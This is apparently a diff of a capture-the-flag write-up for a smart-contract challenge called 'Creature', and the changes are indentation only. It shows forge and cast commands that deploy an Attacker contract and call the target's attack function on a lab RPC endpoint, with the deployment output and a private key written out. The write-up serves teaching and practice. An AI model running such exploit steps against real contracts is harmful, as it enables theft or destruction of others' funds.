@@ -50,21 +50,21 @@ To do so, we create a new contract that will be used to call Creature's attack f
 
 
 Now we deploy the contract, specifing rpc url, priv key, target address (Creature addr) and gas limit!!!:
-
-forge create src/Attacker.sol:Attacker --rpc-url http://94.237.61.26:43016/rpc --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4 --constructor-args 0x7e5338eeF14Eb414805245253eac7a334504cF98 --gas-limit 10000000
-[⠊] Compiling...
-[⠒] Compiling 1 files with 0.8.25
-[⠢] Solc 0.8.25 finished in 28.47ms
-Compiler run successful!
-Deployer: 0xed95E71815e1127054cA100ff43F2442f0fb6bBd
-Deployed to: 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4
-Transaction hash: 0x17c14617e9399d7aae38c5f794ba3b0d715a60d346f0bf153004107fbbb435d7
+  
+  forge create src/Attacker.sol:Attacker --rpc-url http://94.237.61.26:43016/rpc --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4 --constructor-args 0x7e5338eeF14Eb414805245253eac7a334504cF98 --gas-limit 10000000
+  [⠊] Compiling...
+  [⠒] Compiling 1 files with 0.8.25
+  [⠢] Solc 0.8.25 finished in 28.47ms
+  Compiler run successful!
+  Deployer: 0xed95E71815e1127054cA100ff43F2442f0fb6bBd
+  Deployed to: 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4
+  Transaction hash: 0x17c14617e9399d7aae38c5f794ba3b0d715a60d346f0bf153004107fbbb435d7
 
 Awesome, so the address of Attacker contract is: 0x0720C9268fee5C4650F39f5804Ff76F632D47fD4
 
 We have now all we need to carry the attack!
 In order, we attack directly calling "attack" function of Creature contract (target address):
-
+  
   cast send -r http://94.237.61.26:43016/rpc 0x7e5338eeF14Eb414805245253eac7a334504cF98 "attack(uint256)" 1000 --gas-limit 10000000 --private-key 0x44dbfca44aad713b92d53876ecb4f7465ab494a70a8c073c644892d5a13365b4
   
   blockHash               0xe96279ce999facecf4940bcf41b52a32483b7b55639536fd704680b4cd684e6e
